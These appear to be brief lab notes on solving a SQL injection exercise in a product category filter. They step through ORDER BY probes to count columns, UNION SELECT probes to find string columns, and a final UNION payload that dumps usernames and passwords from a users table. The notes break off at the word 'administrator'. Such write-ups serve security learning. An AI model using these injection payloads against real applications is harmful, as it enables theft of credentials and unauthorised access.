SQLi - Product category filter

End Goals: 
- Output usernames & passwords in the users table
- Login as administrator usernames

ANALYSIS

1. Determine the number of columns that the vulnerable query is using (iteratively)

' order by 1--  # 200 response code => Column exists
' order by 2--  # 200 response code => Column exists
' order by 3--  # "Internal Server Error" => Column doesn't exists

This means the table has only 2 columns

2. Determine column data type

select a, b from products where category='Gifts'
' UNION select 'a', NULL--  # 200 response code
' UNION select NULL, 'a'--  # 200 response code

Both columns are of data type "string" => We can use both columns to output data from other tables in the DB

We can do this as below:

' UNION select username, password from users--

We get below:

administrator
